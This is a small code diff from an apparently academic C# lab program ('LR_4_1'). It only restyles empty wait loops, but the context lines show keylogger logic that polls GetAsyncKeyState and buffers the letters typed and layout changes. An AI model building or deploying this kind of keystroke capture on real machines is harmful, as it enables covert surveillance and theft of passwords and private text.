@@ -40,7 +40,7 @@ namespace LR_4_1
                         {
                             if (GetAsyncKeyState(j) != 0 && j != 160 && j != 161 && j != 16)
                             {
-                                while (GetAsyncKeyState(j) != 0) ;
+                                while (GetAsyncKeyState(j) != 0) {};
                                 if (j >= 65 && j <= 90)
                                 {
                                     buf.Append((Keys)j);
@@ -67,7 +67,7 @@ namespace LR_4_1
                     {
                         if (ShiftPushed())
                         {
-                            while (ShiftPushed()) ;
+                            while (ShiftPushed()) {};
                             buf.Append("<layout change>");
                         }
                     }
@@ -78,7 +78,7 @@ namespace LR_4_1
                     {
                         if (GetAsyncKeyState(i) != 0)
                         {
-                            while (GetAsyncKeyState(i) != 0) ;
+                            while (GetAsyncKeyState(i) != 0) {};
                             if (i >= 65 && i <= 90)
                             {
                                 buf.Append((char)(i + 32));
